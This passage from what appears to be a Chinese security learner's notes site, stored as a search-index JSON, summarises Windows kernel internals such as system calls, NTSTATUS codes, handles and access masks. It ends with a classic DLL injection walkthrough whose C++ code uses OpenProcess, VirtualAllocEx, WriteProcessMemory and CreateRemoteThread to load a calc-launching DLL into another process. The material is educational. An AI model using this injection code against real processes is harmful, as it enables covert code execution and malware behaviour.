bf\u95ee\u6307\u5b9a\u5bf9\u8c61\u3002 SystemCall\u7684API\u4f1a\u4ee5Nt\u6216\u8005Zw\u5f00\u5934\u3002\u5bf9\u4e8e\u7528\u6237\u6001\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u524d\u7f00\u90fd\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u5bf9\u4e8e\u5185\u6838\u6001\u6765\u8bf4\uff0cZw\u524d\u7f00\u7684API\u4f1a\u6539\u53d8\u5b89\u5168\u68c0\u67e5\u8fdb\u7a0b\uff08\u7b2c\u4e03\u7ae0\u7ec6\u8bf4\uff09\u3002 NtCreateMutant\u7ed3\u6784 \u4e0b\u9762\u5c06\u4ee5NtCreateMutant\u8bb2\u89e3\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528API\u7684\u7ed3\u6784 \u7cfb\u7edf\u8c03\u7528\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u53e5\u67c4\uff08HANDLE\uff09\uff0c\u5728\u51fd\u6570\u6210\u529f\u6267\u884c\u65f6\u4f5c\u4e3a\u4e00\u4e2a\u5df2\u6253\u5f00\u7684\u5bf9\u8c61\u7684\u53e5\u67c4\uff0c\u901a\u8fc7\u5176\u5b83\u7cfb\u7edf\u8c03\u7528\u6765\u4f7f\u7528\u8be5\u53e5\u67c4\u53bb\u8bbf\u95ee\u5c5e\u6027\u5e76\u8fdb\u884c\u64cd\u4f5c\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570DesiredAccess\uff0c\u8868\u793a\u8c03\u7528\u8005\u8d4b\u4e88\u53e5\u67c4\u7684\u6743\u9650\uff0c\u5728\u540e\u7eed\u4f1a\u66f4\u8be6\u7ec6\u8ba8\u8bba\u8fd9\u4e2a\u53c2\u6570\uff0c\u56e0\u4e3a\u5b83\u4e0eSRM\u76f8\u5173 \u7b2c\u4e09\u4e2a\u5219\u4e3aObjectAttributes\uff0c\u5b9a\u4e49\u4e86\u8981\u6253\u5f00\u6216\u521b\u5efa\u7684\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u5b83\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u7ed3\u6784\u5982\u4e0b ObjectAttributes\u7b2c\u4e00\u4e2a\u53c2\u6570Length\u8868\u793a\u8fd9\u4e2a\u7ed3\u6784\u4f53\u7684\u603b\u957f\u5ea6\uff0c\u7528\u4e8e\u786e\u4fdd\u6574\u4e2a\u7ed3\u6784\u4f53\u90fd\u88ab\u4f20\u9012\u8fdb\u7cfb\u7edf\u8c03\u7528\u8fc7\u7a0b\u91cc\u3002 ObjectAttributes\u7b2c\u4e8c\u4e2a\u53c2\u6570\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570RootDirectory\uff0c\u5b83\u4eec\u540c\u65f6\u4f7f\u7528\u4ee5\u6307\u793a\u7cfb\u7edf\u8c03\u7528\u5982\u4f55\u67e5\u627e\u6b63\u5728\u8bbf\u95ee\u7684OMNS\u8d44\u6e90\uff0cRootDirectory\u662f\u4e00\u4e2a\u53e5\u67c4\uff0c\u6307\u793a\u51fa\u4e00\u4e2a\u6253\u5f00\u7684OMNS\u76ee\u5f55\u5bf9\u8c61\u53e5\u67c4\u3002ObjectName\u5b57\u6bb5\u662f\u4e00\u4e2a\u6307\u5411UNICODE_STRING\u7ed3\u6784\u7684\u6307\u9488\uff08\u5982\u4e0b\uff09\uff0c\u7528\u4e8e\u4ece\u7f13\u51b2\u533a\u63a5\u6536\u5b57\u7b26\u4e32\u5bf9\u8c61\u3002 \u5982\u679c\u60f3\u8981\u6307\u5411\\BaseNamedObjects\\ABC\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ec5\u8bbe\u7f6eObjectName\u4e3a\\BaseNamedObjects\\ABC\u6216\u8005\u5c06RootDirectory\u8bbe\u7f6e\u4e3a\\BaseNamedObjects\uff0cObjectName\u8bbe\u7f6e\u4e3aABC\u3002 ObjectAttributes\u7b2c\u56db\u4e2a\u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u5bf9\u8c61\u540d\u79f0\u7684\u5bfb\u5740\u8fc7\u7a0b\u4ee5\u53ca\u8fd4\u56de\u7684\u53e5\u67c4\u7684\u6743\u9650\uff0c\u5982\u4e0b\u8868 ObjectAttributes\u6700\u540e\u4e24\u4e2a\u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u5b89\u5168\u63cf\u8ff0\u7b26\uff08\u7b2c\u4e94\u7ae0\u8be6\u7ec6\u8ba8\u8bba\uff09\u548c Security Quality of Service (SQoS\uff0c\u7b2c\u56db\u7ae0\u8be6\u7ec6\u8ba8\u8bba) \u8fd4\u56de\u5230NtCreateMutant\u7684\u7b2c\u56db\u4e2a\u53c2\u6570InitialOwner\uff0c\u5728\u8fd9\u91cc\u7528\u4e8e\u6307\u5b9a\u521b\u9020\u7684\u5bf9\u8c61\uff08\u8fd9\u4e2a\u51fd\u6570\u521b\u9020\u7684\u5bf9\u8c61\u662fMutant\uff0c\u4e00\u4e2a\u548c\u7ebf\u7a0b\u540c\u6b65\u6709\u5173\u7684\u5bf9\u8c61\uff09\u662f\u5426\u5f52\u5c5e\u4e8e\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u7684\u7528\u6237\u3002\u8fd9\u91cc\u53ef\u4ee5\u8bbe\u7f6e\u6709\u5f88\u591a\u590d\u6742\u7684\u53c2\u6570\uff0c\u5728\u540e\u6587\u8ba8\u8bba\u3002","title":"System Call\u7cfb\u7edf\u8c03\u7528"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#ntstatus-codes","text":"\u6240\u6709\u7cfb\u7edf\u8c03\u7528\u90fd\u4f1a\u8fd4\u56de\u4e00\u4e2a32bit\u7684NTSTATUS code\uff0c\u7ed3\u6784\u5982\u4e0b \u5728NTSTATUS code 30\u548c31\u4f4dbit\u7684\u503c\u7528\u4e8e\u8868\u793a\u8fd9\u4e2a\u7cfb\u7edf\u8c03\u7528\u7684\u6267\u884c\u72b6\u6001\uff08\u662f\u5426\u6210\u529f\u6216\u8005\u6267\u884c\u9519\u8bef\u7b49\uff09 \u5982\u679c\u4e25\u91cd\u6027\u662f\u8b66\u544a\u6216\u9519\u8bef\uff0c\u90a3\u4e48\u72b6\u6001\u7801\u7684\u7b2c31\u4f4d\u5c06\u88ab\u8bbe\u7f6e\u4e3a1\u3002\u5982\u679c\u5c06\u72b6\u6001\u7801\u89c6\u4e3a\u6709\u7b26\u53f7\u768432\u4f4d\u6574\u6570\uff0c\u90a3\u4e48\u8fd9\u4e2a\u4f4d\u8868\u793a\u4e00\u4e2a\u8d1f\u503c\u3002\u901a\u5e38\u7684\u7f16\u7801\u60ef\u4f8b\u662f\u5047\u8bbe\uff0c\u5982\u679c\u72b6\u6001\u7801\u662f\u8d1f\u6570\uff0c\u90a3\u4e48\u8be5\u4ee3\u7801\u8868\u793a\u4e00\u4e2a\u9519\u8bef\uff0c\u5982\u679c\u662f\u6b63\u6570\uff0c\u90a3\u4e48\u8868\u793a\u6210\u529f\u3002\u4ece\u8868\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u5047\u8bbe\u5e76\u4e0d\u5b8c\u5168\u6b63\u786e\uff0c\u56e0\u4e3a\u8d1f\u7684\u72b6\u6001\u7801\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u8b66\u544a\uff0c\u4f46\u5728\u5b9e\u8df5\u4e2d\u5b83\u8db3\u591f\u6709\u6548\u3002 29\u6bd4\u7279\u4f4d\u7684CC\u7528\u4e8e\u8868\u793a\u72b6\u6001\u7801\u662f\u5426\u7531Microsoft\u5b9a\u4e49\uff08\u503c\u4e3a0\uff09\u8fd8\u662f\u7531\u7b2c\u4e09\u65b9\u5b9a\u4e49\uff08\u503c\u4e3a1\uff09\u3002\u4f46\u5176\u5b9e\u7b2c\u4e09\u65b9\u6ca1\u5fc5\u8981\u9075\u5b88\u8fd9\u4e2a\u89c4\u8303\u3002 28\u4f4d\u7684R\u662f\u4e00\u4e2a\u56fa\u5b9a\u503c0. 27-16\u6bd4\u7279\u4f4d\u7684Facility\u7528\u4e8e\u6307\u793a\u4e0e\u72b6\u6001\u7801\u76f8\u5173\u8054\u7684\u7ec4\u4ef6\u6216\u8005\u5b50\u7cfb\u7edf\uff0c\u5fae\u8f6f\u9884\u5b9a\u4e49\u4e86\u5927\u7ea650\u4e2aFacility\u3002\u7b2c\u4e09\u65b9\u5e94\u8be5\u5b9a\u4e49\u81ea\u5df1\u7684Facility\u5e76\u7ed3\u5408\u4ee3\u7801\u4e0e\u5fae\u8f6f\u9884\u5b9a\u4e49\u7684Facility\u533a\u5206\u5f00\u6765\u3002\u5982\u4e0b\u6709\u51e0\u4e2a\u5e38\u89c1Facility 15-0\u6bd4\u7279\u4f4d\u5219\u662f\u7531\u5b9e\u65bd\u8005\u81ea\u5df1\u5b9a\u4e49\u7684\u72b6\u6001\u7801\uff0c\u5982\u4e0b\u8868\u5c55\u793a\u4e00\u6837\u3002","title":"NTSTATUS Codes"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#_5","text":"\u7528\u6237\u5c42\u4e0d\u80fd\u76f4\u63a5\u8bfb\u5199\u5185\u6838\u5c42\u7684\u5185\u5b58\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de\u7684\u5bf9\u8c61\u53e5\u67c4\u53bb\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u5185\u6838\u4e2d\u6709\u4e00\u4efd\u4e0e\u5982\u4e0b\u4e09\u4e2a\u4fe1\u606f\u76f8\u5173\u8054\u7684\u53e5\u67c4\u8868\uff08handle table\uff09: \u53e5\u67c4\u7684\u6570\u503c\u6807\u8bc6\u7b26\u3002 \u53e5\u67c4\u88ab\u6388\u4e88\u7684\u6743\u9650\uff0c\u4f8b\u5982\u8bfb\u6216\u5199\u3002 \u6307\u5411\u5185\u6838\u5185\u5b58\u4e2d\u5bf9\u8c61\u7ed3\u6784\u7684\u6307\u9488\u3002 \u5728\u5185\u6838\u53ef\u4ee5\u4f7f\u7528\u53e5\u67c4\u4e4b\u524d\uff0c\u7cfb\u7edf\u8c03\u7528\u5b9e\u73b0\u5fc5\u987b\u4f7f\u7528\u8bf8\u5982ObReferenceObjectByHandle\u4e4b\u7c7b\u7684\u5185\u6838API\u4ece\u53e5\u67c4\u8868\u4e2d\u67e5\u627e\u5185\u6838\u5bf9\u8c61\u6307\u9488\u3002\u901a\u8fc7\u95f4\u63a5\u63d0\u4f9b\u53e5\u67c4\uff0c\u5185\u6838\u7ec4\u4ef6\u53ef\u4ee5\u5c06\u53e5\u67c4\u7f16\u53f7\u8fd4\u56de\u7ed9\u7528\u6237\u6a21\u5f0f\u5e94\u7528\u7a0b\u5e8f\uff0c\u800c\u4e0d\u76f4\u63a5\u66b4\u9732\u5185\u6838\u5bf9\u8c61\u3002 \u6587\u5b57\u5f88\u62bd\u8c61\uff0c\u770b\u56fe\uff1a \u5982\u679c\u8bf7\u6c42\u7684\u8bbf\u95ee\u6743\u9650\u4e0e\u53e5\u67c4\u8868\u6761\u76ee\u4e2d\u8bb0\u5f55\u7684\u6388\u4e88\u7684\u8bbf\u95ee\u6743\u9650\u4e0d\u5339\u914d\uff0cAPI\u5c06\u8fd4\u56deSTATUS_ACCESS_DENIED\uff0c\u8f6c\u6362\u64cd\u4f5c\u5c06\u5931\u8d25\u3002\u540c\u6837\uff0c\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u4e0d\u5339\u914d\uff0cAPI\u5c06\u8fd4\u56deSTATUS_OBJECT_TYPE_MISMATCH\u3002\u8fd9\u4e9b\u6b65\u9aa4\u6709\u52a9\u4e8e\u786e\u4fdd\u53ea\u6709\u7ecf\u8fc7\u6388\u6743\u7684\u7528\u6237\u80fd\u591f\u6267\u884c\u7279\u5b9a\u64cd\u4f5c\u5e76\u8bbf\u95ee\u7279\u5b9a\u7c7b\u578b\u7684\u5bf9\u8c61\u3002 \u8fd9\u4e24\u9879\u68c0\u9a8c\u5bf9\u4e8e\u7cfb\u7edf\u7684\u5b89\u5168\u6765\u8bf4\u662f\u975e\u5e38\u597d\u7684\uff1a \u6743\u9650\u68c0\u6d4b\u9632\u6b62\u7528\u6237\u8d8a\u6743\u8bbf\u95ee \u7c7b\u578b\u68c0\u6d4b\u9632\u6b62\u7528\u6237\u63d0\u4ea4\u63d0\u4ea4\u7c7b\u578b\u4e0d\u76f8\u5e72\u7684\u5185\u6838\u5bf9\u8c61\u9020\u6210\u5185\u6838\u7684\u7c7b\u578b\u6df7\u6dc6\uff0c\u4ece\u800c\u9020\u6210\u5b89\u5168\u5371\u673a\u3002","title":"\u5bf9\u8c61\u53e5\u67c4"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#access-masks","text":"\u53e5\u67c4\u8868\u91cc\u4e00\u4e2a\u53e5\u67c4\u5bf9\u5e94\u7684\u6743\u9650\uff0c\u88ab\u5b58\u50a8\u572832\u6bd4\u7279\u957f\u7684\u7ed3\u6784\u91cc\uff0c\u8fd9\u4e2a\u7ed3\u6784\u53eb\u505aAcessMasks\uff0c\u5b83\u4e5f\u662f\u7cfb\u7edf\u8c03\u7528\u53c2\u6570\u91cc\u7684DesiredAccess\u53c2\u6570\u7684\u7ed3\u6784\u3002 0-15bits\u7684Type Specific Access\uff08\u7c7b\u578b\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\uff09\u662fAccess Mask\u6700\u91cd\u8981\u7684\u90e8\u5206\uff0c\u7528\u4e8e\u7ed9\u7279\u5b9a\u5185\u6838\u5bf9\u8c61\u7684\u6388\u4e88\u4e13\u5c5e\u7684\u6743\u9650\uff1a \u6bd4\u5982\u4e00\u4e2aFile\u5bf9\u8c61\u4f1a\u6709\u4e13\u5c5e\u7684ReadData\u6216\u8005WriteData\u6743\u9650\u3002 Standard Access\uff08\u6807\u51c6\u8bbf\u95ee\u6743\u9650\uff09\u4e5f\u88ab\u7528\u4e8e\u6388\u4e88\u6743\u9650\uff0c\u4e0d\u8fc7\u5b83\u6388\u4e88\u7684\u6743\u9650\u90fd\u662f\u901a\u7528\u6743\u9650\uff0c\u6807\u51c6\u8bbf\u95ee\u6743\u9650\u7528\u4e8e\u5b9a\u4e49\u8c01\u53ef\u4ee5\u6267\u884c\u8fd9\u4e9b\u901a\u7528\u64cd\u4f5c\uff0c\u4efb\u4f55\u5bf9\u8c61\u90fd\u53ef\u4ee5\u6388\u4e88\u8fd9\u4e9b\u6743\u9650\uff1a Delete \u5220\u9664 ReadControl \u53ef\u4ee5\u8bfb\u53d6\u8be5\u5bf9\u8c61\u7684\u5b89\u5168\u63cf\u8ff0\u7b26 WriteDac \u53ef\u5c06\u5b89\u5168\u63cf\u8ff0\u7b26\u7684\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\uff08DAC\uff09\u5199\u5165\u5bf9\u8c61 ..... \u603b\u7684\u6765\u8bf4\uff0c\u6807\u51c6\u8bbf\u95ee\u6743\u9650\u5b9a\u4e49\u4e86\u5bf9\u8c61\u7684\u57fa\u672c\u8bbf\u95ee\u89c4\u5219\uff0c\u800c\u7c7b\u578b\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\u5219\u5141\u8bb8\u66f4\u7ec6\u7c92\u5ea6\u7684\u3001\u5bf9\u8c61\u7279\u5b9a\u7684\u64cd\u4f5c\u3002 \u968f\u540e\u4fbf\u662f27-21bits\u7684Reversed/Special Access.\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u662fReversed\uff08\u4fdd\u7559\uff09\uff0c\u4f46\u4e5f\u53ef\u80fd\u662f\u5982\u4e0b\u4e24\u4e2aSpecial Access AccessSystemSecurity \u8bfb\u5199\u5bf9\u8c61\u7684\u5ba1\u8ba1\u4fe1\u606f\uff08\u7b2c\u516b\u7ae0\u8be6\u7ec6\u8ba8\u8bba\uff09 MaximumAllowed \u5728\u6267\u884c\u8bbf\u95ee\u6743\u9650\u68c0\u67e5\u65f6\u8bf7\u6c42\u5bf9\u8c61\u7684\u6700\u5927\u8bbf\u95ee\u6743\u9650\u3002\uff08\u7b2c\u4e5d\u7ae0\u8be6\u7ec6\u8ba8\u8bba\uff09 \u968f\u540e\u4fbf\u662f28-31bits\u7684generic access\u3002\u5b83\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\u7684 DesiredAccess \u53c2\u6570\u8bf7\u6c42\u5bf9\u5185\u6838\u5bf9\u8c61\u7684\u8bbf\u95ee\u6743\u9650\u3002\u901a\u7528\u8bbf\u95ee\u5206\u4e3a\u56db\u4e2a\u5e7f\u6cdb\u7684\u7c7b\u522b\uff0c\u5305\u62ec GenericRead\uff08\u901a\u7528\u8bfb\u53d6\uff09\u3001GenericWrite\uff08\u901a\u7528\u5199\u5165\uff09\u3001GenericExecute\uff08\u901a\u7528\u6267\u884c\uff09\u548cGenericAll\uff08\u901a\u7528\u5168\u90e8\uff09\u3002 \u5177\u4f53\u70b9\u5c31\u662f\uff0c\u5f53\u8bf7\u6c42generic access\u4e2d\u4efb\u610f\u4e00\u4e2a\u6743\u9650\u65f6\uff0cSRM\u4f1a\u81ea\u52a8\u628a\u8fd9\u4e9b\u6743\u9650\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u7c7b\u578b\u9650\u5b9a\u7684\u6743\u9650\u3002 generic access\u4e0e Type-specific access\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u5b58\u50a8\u5728generic mapping table\u91cc \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u6765\u67e5\u770bFile\u5bf9\u8c61\u7684generic mapping table \u5728\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u89c1\u6bcf\u4e2a\u6743\u9650\u90fd\u5bf9\u5e94\u7740\u4e00\u4e2a\u6570\u5b57\uff08numeric access mask\uff09\uff0c\u6709\u65f6\u6211\u4eec\u67e5\u770b\u6743\u9650\u53ef\u80fd\u53ea\u770b\u5f97\u5230\u8fd9\u4e2a\u6570\u5b57\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u6765\u8bb2\u6570\u5b57\u8f6c\u6210\u5bf9\u5e94\u6743\u9650\u540d\uff0c\u6216\u8005\u5bf9\u5e94\u6743\u9650\u540d\u8f6c\u6362\u6210\u5bf9\u5e94\u6570\u5b57 \u5728powershell\u91cc\uff0c\u4e3a\u4e86\u6613\u7528\u6027\uff0cwindows SKD\u5c06\u6743\u9650\u7684\u540d\u5b57\u6539\u4e86\u4e00\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u6765\u67e5\u770b","title":"Access Masks"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#handle-duplication","text":"\u6211\u4eec\u53ef\u4ee5\u7528NtDuplicateObject\u8fd9\u4e2a\u7cfb\u7edf\u8c03\u7528\u6765\u590d\u5236\u53e5\u67c4\u3002 \u6211\u4eec\u8fd9\u6837\u505a\u6709\u4e00\u4e2a\u76ee\u7684\u5c31\u662f\u9632\u6b62\u5185\u6838\u5bf9\u8c61\u88ab\u9500\u6bc1\u2014\u2014\u4e00\u4e2a\u5185\u6838\u5bf9\u8c61\u53ea\u6709\u5f53\u6240\u6709\u53e5\u67c4\u90fd\u5173\u95ed\u540e\u624d\u4f1a\u88ab\u9500\u6bc1\u3002 \u8fd8\u53ef\u4ee5\u7528\u4e8e\u53e5\u67c4\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u95f4\u4f20\u8f93\uff08\u5728\u6e90\u8fdb\u7a0b\u548c\u76ee\u6807\u8fdb\u7a0b\u90fd\u6709DupHandle\u7684\u6743\u9650\u7684\u524d\u63d0\u4e0b\uff09 \u540c\u65f6\u590d\u5236\u65b0\u53e5\u67c4\u65f6\u53ef\u4ee5\u51cf\u5c11\u65b0\u53e5\u67c4\u7684\u6743\u9650\uff0c\u4ece\u800c\u6765\u5b9e\u73b0\u5b89\u5168\u6027\u3002 \u540c\u65f6\uff0c\u4e00\u4e2a\u53e5\u67c4\u6709\u4e24\u4e2a\u7279\u522b\u7684\u5c5e\u6027\uff1aInherit\uff08\u7ee7\u627f\uff09\u548cProtectFromClose\uff1a Inherit\u5c5e\u6027\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u65b0\u8fdb\u7a0b\u5728\u88ab\u521b\u5efa\u65f6\u7ee7\u627f\u7ee7\u627f\u8be5\u53e5\u67c4\u3002\u53e5\u67c4\u7ee7\u627f\u662f\u4e00\u79cd\u5141\u8bb8\u5b50\u8fdb\u7a0b\u7ee7\u627f\u7236\u8fdb\u7a0b\u7684\u53e5\u67c4\u7684\u673a\u5236\uff0c\u4ece\u800c\u4f7f\u5f97\u5b50\u8fdb\u7a0b\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u7236\u8fdb\u7a0b\u7684\u8d44\u6e90\uff0c\u5982\u6587\u4ef6\u53e5\u67c4\u3001\u5957\u63a5\u5b57\u7b49\uff0c\u4ee5\u6267\u884c\u76f8\u5173\u4efb\u52a1\u3002 ProtectFromClose\u5219\u662f\u9632\u6b62\u53e5\u67c4\u88ab\u5173\u95ed\uff0c\u4efb\u4f55\u4f01\u56fe\u5173\u95ed\u6b64\u53e5\u67c4\u7684\u64cd\u4f5c\u90fd\u4f1a\u5931\u8d25\u5e76\u8fd4\u56deSTATUS_HANDLE_NOT_CLOSEABLE \u72b6\u6001\u7801\u3002","title":"HANDLE Duplication"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/","text":"\u5b66\u751f\u65f6\u4ee3\u5b66\u7684windows \u7528\u8fc7\u7684WINDOWS_API\u8bb0\u5f55 windows\\&linux\u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664 WMI\u7c97\u7565\u5b66\u4e60 DLL\u6ce8\u5165\u6280\u672f Windows\u7ec4\u7b56\u7565 WINDOWS\u8bbf\u95ee\u6743\u9650 \u6742\u8bb0 \u5b89\u5168\u89c6\u89d2\u4e0b\u7684RPC\u5165\u95e8","title":"\u5b66\u751f\u65f6\u4ee3\u5b66\u7684windows"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/#windows","text":"\u7528\u8fc7\u7684WINDOWS_API\u8bb0\u5f55 windows\\&linux\u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664 WMI\u7c97\u7565\u5b66\u4e60 DLL\u6ce8\u5165\u6280\u672f Windows\u7ec4\u7b56\u7565 WINDOWS\u8bbf\u95ee\u6743\u9650 \u6742\u8bb0 \u5b89\u5168\u89c6\u89d2\u4e0b\u7684RPC\u5165\u95e8","title":"\u5b66\u751f\u65f6\u4ee3\u5b66\u7684windows"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/","text":"DLL\u6ce8\u5165\u6280\u672f \u76ee\u5f55 DLL\u6ce8\u5165 \u7ecf\u5178DLL\u6ce8\u5165 \u53cd\u5c04\u578bDLL\u6ce8\u5165 DLL\u6ce8\u5165 DLL\u6ce8\u5165\uff0c\u5c31\u662f\u4f7f\u67d0\u4e2a\u8fdb\u7a0b\u5f3a\u884c\u8fd0\u884c\u67d0\u4e00\u4e2aDLL\u6587\u4ef6\u3002 \u7ecf\u5178DLL\u6ce8\u5165 \u5728\u6700\u7ecf\u5178\u7684DLL\u6ce8\u5165\u4e2d\uff0c\u4f1a\u5148\u901a\u8fc7OpenProcess\u51fd\u6570\u6253\u5f00\u76ee\u6807\u8fdb\u7a0b\uff0c\u7136\u540eVirtualAllocEx\u5411\u6307\u5b9a\u8fdb\u7a0b\u5206\u914d\u5185\u5b58\u7a7a\u95f4\uff0c\u968f\u540eWriteProcessMemory\u5411\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4\u4e2d\u5199\u5165DLL\u6587\u4ef6\u5185\u5bb9\uff0c\u7136\u540eCreateRemoteThread\u4f7f\u8fdc\u7a0b\u8fdb\u7a0b\u8c03\u7528DLL\u6587\u4ef6\u3002 \u6211\u4eec\u4ee5\u5f39\u51fa\u8ba1\u7b97\u5668\u4e3a\u76ee\u7684\uff0c\u6765\u63a2\u7a76\u5982\u4f55\u901a\u8fc7C++\u5b9e\u73b0dll\u6ce8\u5165\u3002 #include \"pch.h\" #include<stdlib.h> BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH||DLL_THREAD_ATTACH: system(\"calc\"); } return TRUE; } \u6240\u4ee5\u6211\u4eec\u7684DLL\u5c31\u662f\u5728\u88ab\u52a0\u8f7d\u7684\u65f6\u5019\u5f39\u4e00\u4e2a\u8ba1\u7b97\u5668 \u7136\u540e\u7f16\u8f91\u6211\u4eec\u7684\u6ce8\u5165\u5668,\u6ce8\u610f\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u90fd\u662f\u7528ASCII\u5b57\u7b26\u5b8c\u6210\u7684\u800c\u4e0d\u662f\u5bbd\u5b57\u7b26\u3002 \u6253\u5f00\u6307\u5b9a\u7684\u8fdb\u7a0b\uff0c\u83b7\u53d6\u53e5\u67c4 ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1])); \u5411\u8fdc\u7a0b\u8fdb\u7a0b\u5206\u914d\u5185\u5b58\uff0c\u5e76\u5411\u5176\u5199\u5165\u6211\u4eec\u7684DLL\u6587\u4ef6\u8def\u5f84 ```\\ LPVOID remotebuffer1 = VirtualAllocEx(CurrentProcessHandle, NULL, strlen(dllpath), MEM_COMMIT, PAGE_READWRITE); write = WriteProcessMemory(CurrentProcessHandle, remotebuffer1, dllpath, strlen(dllpath), NULL); \u52a8\u6001\u83b7\u53d6LoadLibraryA \u51fd\u6570 ```\u7eaf\u6587\u672c HMODULE Ker = GetModuleHandleA(\"Kernel32.dll\"); PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(Ker, \"LoadLibraryA\"); \u901a\u8fc7CreateRemoteThread\u4e3a\u8fdc\u7a0b\u8fdb\u7a0b\u521b\u5efa\u7ebf\u7a0b\uff0c\u53bb\u8c03\u7528LoadLibrarayA \u53bb\u52a0\u8f7d\u6307\u5b9aDll CreateRemoteThread(ProcessHandle, NULL, 0, threatStartRoutineAddress, remotebuffer, 0, NULL); \u5927\u81f4\u6d41\u7a0b\u5c31\u8fd9\u6837\u3002 \u53cd\u5c04\u578bDLL\u6ce8\u5165 